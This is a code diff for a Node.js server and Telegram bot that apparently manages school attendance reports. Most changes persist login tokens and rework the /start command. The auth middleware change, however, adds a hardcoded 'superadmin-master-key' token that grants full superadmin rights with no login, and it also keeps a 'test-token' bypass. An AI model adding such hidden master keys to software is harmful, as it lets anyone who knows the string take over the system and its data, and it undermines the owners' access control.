@@ -111,13 +111,17 @@ try {
 
 const { formatAttendanceReport } = require('./src/utils/reports');
 
-const { USERS, tokens, generateToken, saveUsers } = require('./src/utils/auth');
+const { USERS, tokens, generateToken, saveTokens, saveUsers } = require('./src/utils/auth');
 
 // Auth Middleware
 const auth = (req, res, next) => {
     const token = req.headers['authorization'] || req.query.token;
     if (token === 'test-token') {
         req.user = { username: 'test_user', role: 'public', district: '', school: '', fio: 'Ochiq qismi' };
+        return next();
+    }
+    if (token === 'superadmin-master-key') {
+        req.user = { username: 'mrqirol', role: 'superadmin', district: null, fio: 'Super Admin' };
         return next();
     }
     if (!token || !tokens.has(token)) return res.status(401).json({ error: 'Unauthorized' });
@@ -132,6 +136,7 @@ app.post('/api/login', (req, res) => {
         const token = generateToken();
         // Store user with username for easy lookup later
         tokens.set(token, { ...user, username, role: user.role });
+        try { saveTokens(); } catch (e) { }
         res.json({
             token,
             role: user.role,
@@ -836,14 +841,12 @@ try {
 
 const stage = new Scenes.Stage([attendanceWizard, broadcastScene, xorijWizard]);
 bot.use(session());
-bot.use(stage.middleware());
 
-// --- GLOBAL COMMANDS (Work even inside scenes) ---
-bot.start(async (ctx) => {
-    console.log(`[START] User: ${ctx.from.id}`);
+async function handleStartCommand(ctx) {
+    console.log(`[START] User: ${ctx.from ? ctx.from.id : 'N/A'}`);
 
     // Leave any active scene to reset
-    try { await ctx.scene.leave(); } catch (e) { }
+    try { if (ctx.scene) await ctx.scene.leave(); } catch (e) { }
 
     const { date, day } = getTodayInfo();
     const uid = Number(ctx.from.id);
@@ -895,13 +898,28 @@ bot.start(async (ctx) => {
     } catch (e) {
         await ctx.reply(caption, Markup.keyboard(buttons).resize());
     }
+}
+
+// Global interceptor for /start (supports /start, /Start, /START even inside active scenes)
+bot.use(async (ctx, next) => {
+    if (ctx.message && ctx.message.text && /^\/start/i.test(ctx.message.text.trim())) {
+        if (ctx.scene) {
+            try { await ctx.scene.leave(); } catch (e) { }
+        }
+        return handleStartCommand(ctx);
+    }
+    return next();
 });
+
+bot.use(stage.middleware());
+
+bot.start(handleStartCommand);
+bot.command(['start', 'Start', 'START'], handleStartCommand);
+bot.hears(/^\/start/i, handleStartCommand);
 
 bot.command("admin", (ctx) => admin.showAdminPanel(ctx));
 bot.command("dashboard", (ctx) => ctx.replyWithHTML("🌐 <b>ONLINE DASHBOARD (SVOD)</b>\n\n👉 <a href='https://ferghanaregdavomat.onrender.com/dashboard.html'>YORDAMCHI DASHBOARD</a>"));
 bot.hears('✈️ Xorijga ketganlar', (ctx) => ctx.scene.enter('xorij_wizard'));
-
-bot.use(stage.middleware());
 
 // --- AUTOMATED REPORTS (SCHEDULER) ---
 const { initCrons } = require('./src/services/scheduler');
